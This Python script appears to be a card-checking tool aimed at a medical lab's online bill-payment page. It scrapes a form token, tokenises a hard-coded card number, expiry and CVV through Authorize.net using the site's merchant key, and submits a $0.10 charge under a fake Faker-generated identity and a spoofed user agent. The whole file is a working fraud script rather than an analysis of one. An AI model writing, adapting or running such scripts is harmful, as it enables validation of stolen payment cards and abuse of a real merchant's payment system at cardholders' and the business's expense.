import requests
from user_agent import generate_user_agent
from faker import Faker
import re
import json

r = requests.Session()
u = generate_user_agent()
f = Faker()
s = f.name()
x = f.email()

v1 = r.get('https://avanticmedicallab.com/pay-bill-online/')
x1 = re.search(r'name="wpforms\[token\]" value="([^"]+)"', v1.text)
x2 = x1.group(1) if x1 else 'ccf1f214e6ae1c99c9bf26c60650bd7f'

headers = {
    'Accept': '*/*',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/json; charset=UTF-8',
    'Origin': 'https://avanticmedicallab.com',
    'Referer': 'https://avanticmedicallab.com/',
    'User-Agent': u,
}

json_data = {
    'securePaymentContainerRequest': {
        'merchantAuthentication': {
            'name': '3c5Q9QdJW',
            'clientKey': '2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu',
        },
        'data': {
            'type': 'TOKEN',
            'id': '26f657f1-bad7-782d-6587-eaea7ce8ec60',
            'token': {
                'cardNumber': '5251559618531313',
                'expirationDate': '0630',
                'cardCode': '217',
            },
        },
    },
}

resesponse = r.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
x3 = resesponse.content.decode('utf-8-sig')
x4 = json.loads(x3)
xx4 = x4['opaqueData']['dataDescriptor']
x5 = x4['opaqueData']['dataValue']

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Origin': 'https://avanticmedicallab.com',
    'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
    'User-Agent': u,
    'X-Requested-With': 'XMLHttpRequest',
}

files = {
    'wpforms[fields][1][first]': (None, s),
    'wpforms[fields][1][last]': (None, s),
    'wpforms[fields][17]': (None, '0.10'),
    'wpforms[fields][2]': (None, x),
    'wpforms[fields][3]': (None, '(315) 424-8967'),
    'wpforms[fields][14]': (None, ''),
    'wpforms[fields][4][address1]': (None, 'New York 39 Ave'),
    'wpforms[fields][4][city]': (None, 'New York'),
    'wpforms[fields][4][state]': (None, 'NY'),
    'wpforms[fields][4][postal]': (None, '10001'),
    'wpforms[fields][6]': (None, '$ 0.10'),
    'wpforms[fields][11][]': (None, 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.'),
    'wpforms[id]': (None, '4449'),
    'wpforms[author]': (None, '1'),
    'wpforms[post_id]': (None, '3388'),
    'wpforms[authorize_net][opaque_data][descriptor]': (None, 'COMMON.ACCEPT.INAPP.PAYMENT'),
    'wpforms[authorize_net][opaque_data][value]': (None, x5),
    'wpforms[authorize_net][card_data][expire]': (None, '11/28'),
    'wpforms[token]': (None, '5994aee8e72ba4d5b85881f78541bdc8'),
    'action': (None, 'wpforms_submit'),
    'page_url': (None, 'https://avanticmedicallab.com/pay-bill-online/'),
    'page_title': (None, 'Pay Bill Online'),
    'page_id': (None, '3388'),
}

response = r.post('https://avanticmedicallab.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, files=files)

print(response.text)